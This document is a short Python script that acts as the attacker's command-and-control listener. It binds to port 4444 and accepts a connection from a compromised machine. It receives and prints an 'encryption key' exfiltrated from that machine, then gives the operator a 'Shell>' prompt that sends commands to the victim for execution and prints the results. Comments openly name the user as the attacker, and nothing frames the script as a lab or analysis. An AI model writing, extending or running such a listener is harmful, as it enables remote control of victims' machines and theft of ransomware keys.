import socket

def listener(host, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((host, port))
            s.listen(1)
            print(f"Listening on {host}:{port}...")
            
            conn, addr = s.accept()
            print(f"Connection received from {addr}")

            with conn:
                # Receive and print the encryption key
                encryption_key = conn.recv(1024).decode()
                if encryption_key:
                    print(f"Encryption Key: {encryption_key}")
                else:
                    print("Failed to receive the encryption key.")
                    return

                while True:
                    # Receive commands from the attacker and execute them
                    command = input("Shell> ")  # Attacker can type commands here
                    if command.lower() == "exit":
                        conn.sendall(b"exit")
                        break
                    if command:
                        conn.sendall(command.encode())
                        output = conn.recv(1024)
                        print(output.decode())
    except Exception as e:
        print(f"Error: {e}")

# Replace with the attacker's IP and the port you want to listen on
listener("0.0.0.0", 4444)  # '0.0.0.0' listens on all interfaces

